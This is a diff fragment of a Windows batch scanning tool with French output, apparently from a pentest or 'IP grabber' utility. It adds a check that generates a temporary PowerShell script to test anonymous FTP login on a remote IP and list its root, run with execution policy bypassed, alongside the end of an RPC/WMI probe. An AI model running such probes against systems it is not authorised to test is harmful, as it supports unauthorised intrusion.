+    >> "!RPC_TMP!" echo } catch { Write-Host "  [-] Echec RPC/WMI : $($_.Exception.Message)" -f Red }
+    powershell -NoProfile -ExecutionPolicy Bypass -File "!RPC_TMP!"
+    if exist "!RPC_TMP!" del /f /q "!RPC_TMP!"
+    echo.
+    pause
+    goto wan_public_scan
+)
+
+if "!sel_action!"=="ftp_anon" (
+    cls
+    echo.
+    echo %B%  [FTP] TEST LOGIN ANONYME%N%
+    echo  Cible : !remote_ip!:21
+    echo.
+    set "FTP_TMP=%TEMP%\ftp_anon_%RANDOM%.ps1"
+    >> "!FTP_TMP!" echo $ip = "!remote_ip!"
+    >> "!FTP_TMP!" echo $req = [System.Net.FtpWebRequest]::Create("ftp://$ip/")
+    >> "!FTP_TMP!" echo $req.Credentials = New-Object System.Net.NetworkCredential("anonymous","pentest@lab.local")
+    >> "!FTP_TMP!" echo $req.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
+    >> "!FTP_TMP!" echo $req.Timeout = 5000
+    >> "!FTP_TMP!" echo try {
+    >> "!FTP_TMP!" echo     $resp = $req.GetResponse()
+    >> "!FTP_TMP!" echo     $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
+    >> "!FTP_TMP!" echo     $content = $reader.ReadToEnd()
+    >> "!FTP_TMP!" echo     Write-Host "  [+] FTP ANONYME ACCEPTE !" -f Green
+    >> "!FTP_TMP!" echo     Write-Host "  Contenu racine :" -f Yellow
+    >> "!FTP_TMP!" echo     Write-Host $content -f Cyan
+    >> "!FTP_TMP!" echo     $reader.Close() ; $resp.Close()
+    >> "!FTP_TMP!" echo } catch { Write-Host "  [-] FTP anonyme refuse : $($_.Exception.Message)" -f Red }
+    powershell -NoProfile -ExecutionPolicy Bypass -File "!FTP_TMP!"
+    if exist "!FTP_TMP!" del /f /q "!FTP_TMP!"
+    echo.
+    pause
+    goto wan_public_scan
+)
+
 goto cyber_ip_grabber
 
 :start_lan_scan
